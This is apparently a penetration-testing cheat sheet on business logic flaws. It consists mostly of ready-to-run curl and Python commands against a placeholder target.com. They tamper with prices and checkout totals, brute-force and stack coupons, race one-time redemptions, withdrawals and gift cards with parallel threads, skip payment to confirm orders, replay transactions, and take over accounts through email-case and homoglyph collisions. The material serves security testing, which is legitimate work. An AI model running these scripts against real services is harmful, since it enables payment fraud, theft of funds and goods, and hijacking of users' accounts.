# Business Logic Vulnerabilities — Price Manipulation, Race Conditions, Workflow Bypass

Test application-specific logic flaws that scanners miss: price/quantity manipulation, race conditions, workflow skipping, coupon abuse, account takeover chains.

## Phase 1: Price & Quantity Manipulation

```bash
# Negative quantity → negative total (store credits attacker):
curl -s -X POST "https://target.com/api/cart/add" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSION" \
  -d '{"product_id": 1, "quantity": -1}'

# Zero price modification (intercept checkout):
curl -s -X PUT "https://target.com/api/cart/item/1" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSION" \
  -d '{"price": 0, "quantity": 1}'

# Integer overflow on quantity:
curl -s -X POST "https://target.com/api/cart" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSION" \
  -d '{"quantity": 9999999999, "product_id": 1}'

# Manipulate total in final checkout request:
curl -s -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSION" \
  -d '{"items": [{"id":1,"qty":1}], "total": 0.01, "currency": "USD"}'

# Currency confusion (pay in lower-value currency):
curl -s -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSION" \
  -d '{"total": 10.00, "currency": "JPY"}'  # 10 JPY instead of 10 USD
```

---

## Phase 2: Coupon & Discount Abuse

```bash
# Apply same coupon multiple times:
for i in $(seq 1 5); do
  curl -s -X POST "https://target.com/api/apply-coupon" \
    -H "Cookie: SESSION" \
    -d "code=SAVE50"
  echo "Attempt $i"
done

# Stack multiple coupons:
curl -s -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSION" \
  -d '{"coupons": ["SAVE50", "FREESHIP", "NEWUSER10"], "items": [...]}'

# Apply expired coupon:
curl -s -X POST "https://target.com/api/apply-coupon" \
  -H "Cookie: SESSION" \
  -d "code=EXPIRED2020"

# Generate valid coupon format via enumeration:
for code in $(python3 -c "
for i in range(1000, 9999):
    print(f'SAVE{i}')
"); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/apply-coupon" \
    -d "code=$code" -H "Cookie: SESSION")
  [ "$STATUS" = "200" ] && echo "VALID: $code"
done

# Referral self-referral:
curl -s -X POST "https://target.com/api/refer" \
  -H "Cookie: SESSION" \
  -d "referral_code=YOUR_OWN_CODE&email=newemail@test.com"
```

---

## Phase 3: Race Conditions

```bash
# Race condition: use single coupon twice (parallel requests)
# Using parallel curl:
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/api/redeem" \
    -H "Cookie: SESSION" \
    -d "code=ONETIME_CODE" &
done
wait

# Python race condition exploit:
python3 -c "
import threading, requests

session = requests.Session()
session.cookies.update({'session': 'YOUR_SESSION_COOKIE'})

results = []

def redeem():
    r = session.post('https://target.com/api/redeem',
                     json={'code': 'ONETIME_CODE'})
    results.append((r.status_code, r.text[:100]))

threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()

for status, text in results:
    print(status, text)
"

# Race condition on account balance withdrawal:
python3 -c "
import threading, requests

def withdraw():
    r = requests.post('https://target.com/api/withdraw',
                      json={'amount': 100},
                      cookies={'session': 'YOUR_COOKIE'})
    print(r.status_code, r.json())

# Send 10 simultaneous withdrawal requests:
threads = [threading.Thread(target=withdraw) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
"
```

---

## Phase 4: Workflow / State Machine Bypass

```bash
# Skip payment step — go directly from cart to order confirmation:
# Normal flow: /cart → /checkout → /payment → /confirm
# Bypass: skip /payment, go directly to /confirm

# Capture order ID from cart:
ORDER_ID=$(curl -s -X POST "https://target.com/api/orders" \
  -H "Cookie: SESSION" \
  -d '{"items":[{"id":1,"qty":1}]}' | jq -r '.order_id')

# Skip payment, hit confirm directly:
curl -s -X POST "https://target.com/api/orders/$ORDER_ID/confirm" \
  -H "Cookie: SESSION"

# Test step skipping in multi-step forms:
# Step 1 normally sets a state cookie/param
# Try accessing step 3 URL directly:
curl -s "https://target.com/checkout/step3" \
  -H "Cookie: SESSION" \
  -H "Referer: https://target.com/checkout/step1"

# Replay completed transaction:
curl -s -X POST "https://target.com/api/payment/process" \
  -H "Cookie: SESSION" \
  -d "transaction_id=COMPLETED_TXN_ID&amount=100"

# Test order status manipulation:
for status in pending processing shipped delivered cancelled; do
  curl -s -X PUT "https://target.com/api/orders/$ORDER_ID/status" \
    -H "Content-Type: application/json" \
    -H "Cookie: SESSION" \
    -d "{\"status\": \"$status\"}" | jq .
done
```

---

## Phase 5: Account Takeover via Business Logic

```bash
# Email-based ATO: register with victim's email using different case:
curl -s -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email": "VICTIM@EXAMPLE.COM", "password": "attacker123"}'
# → if server normalizes email on login but not registration → login conflict

# Password reset with email case manipulation:
curl -s -X POST "https://target.com/api/reset-password" \
  -d "email=VICTIM@example.com"  # Different case than stored email

# Username collision via homoglyphs:
# Try: vіctim (with Cyrillic і) vs victim (ASCII i)
curl -s -X POST "https://target.com/api/register" \
  -d "username=adm%D1%96n"  # UTF-8 Cyrillic і

# Account merge logic bypass:
curl -s -X POST "https://target.com/api/merge-accounts" \
  -H "Cookie: ATTACKER_SESSION" \
  -d "merge_with=victim_account_id"

# Email change without re-authentication:
curl -s -X PUT "https://target.com/api/account/email" \
  -H "Cookie: SESSION" \
  -d "new_email=attacker@evil.com"
# Check if confirmation is required before change takes effect
```

---

## Phase 6: Inventory & Reservation Abuse

```bash
# Reserve item without paying → drain inventory:
for i in $(seq 1 100); do
  curl -s -X POST "https://target.com/api/cart/reserve" \
    -H "Cookie: SESSION_$i" \
    -d "item_id=1&qty=10"
done

# Gift card exhaustion via race:
python3 -c "
import threading, requests

def use_giftcard():
    r = requests.post('https://target.com/api/giftcard/redeem',
                      json={'code': 'GIFTCARD_CODE', 'amount': 50},
                      cookies={'session': 'SESSION'})
    print(r.status_code, r.text[:50])

threads = [threading.Thread(target=use_giftcard) for _ in range(5)]
[t.start() for t in threads]
[t.join() for t in threads]
"

# Exploit refund logic (refund without return):
ORDER_ID="ORDER123"
curl -s -X POST "https://target.com/api/orders/$ORDER_ID/refund" \
  -H "Cookie: SESSION" \
  -d "reason=damaged&amount=full"
# Then check if order status is still 'delivered' → refund without returning
```

---

## Phase 7: Logic Tests Checklist

```bash
# Quick business logic probe script:
TARGET="https://target.com"
SESSION="your_session_cookie"

echo "=== Testing negative values ==="
curl -s -X POST "$TARGET/api/cart" -H "Cookie: $SESSION" \
  -d '{"qty":-1,"price":-10}' | jq .

echo "=== Testing zero values ==="
curl -s -X POST "$TARGET/api/cart" -H "Cookie: $SESSION" \
  -d '{"qty":0,"price":0}' | jq .

echo "=== Testing workflow skip ==="
curl -s "$TARGET/checkout/complete" -H "Cookie: $SESSION" | head -3

echo "=== Testing param tampering ==="
curl -s -X POST "$TARGET/api/order" -H "Cookie: $SESSION" \
  -d '{"total":"0.00","currency":"USD"}' | jq .

echo "=== Testing duplicate redemption ==="
curl -s -X POST "$TARGET/api/redeem" -H "Cookie: $SESSION" -d "code=TEST"
curl -s -X POST "$TARGET/api/redeem" -H "Cookie: $SESSION" -d "code=TEST"
```

---

## Pro Tips

1. **Map the full business flow** first — draw state machine, identify every transition
2. **Race conditions** — any "check-then-act" pattern is vulnerable; use 10+ parallel threads
3. **Currency/unit confusion** — look for forex endpoints, check if currency is server-validated
4. **Negative numbers** — try on all numeric fields: quantity, price, duration, credits
5. **Replay protection** — resend completed payment transactions to see if they re-process
6. **Coupon stacking** — many apps prevent same code twice but not different codes together
7. **Email normalization** — different case, plus addressing (`user+tag@`), dots in Gmail

## Summary

Business logic flow: map application state machine → test all numeric fields with negative/zero values → race condition all "one-time" operations → attempt workflow step skipping → test coupon stacking/replay → document with request/response pairs showing exploited state.
